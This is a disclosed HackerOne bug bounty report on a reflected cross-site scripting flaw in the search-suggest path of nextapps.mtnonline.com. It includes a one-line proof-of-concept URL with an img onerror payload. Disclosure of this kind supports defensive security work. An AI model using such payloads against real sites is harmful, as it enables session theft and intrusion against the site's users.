# XSS at http://nextapps.mtnonline.com/search/suggest/q/{xss payload}

## Report Details
- **Report ID**: 1244722
- **URL**: https://hackerone.com/reports/1244722
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-25T23:32:43.751Z
- **Disclosed**: 2022-05-01T21:20:59.255Z

## Reporter
- **Username**: homosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
PoC
```
http://nextapps.mtnonline.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
```
Symbols <'/"> are no filtered that alloweds to inject HTML code. Response has content-type: text/html
{F1353600}

## Impact

XSS at nextapps.mtnonline.com

## Attachments
- mtn.xss.2.png
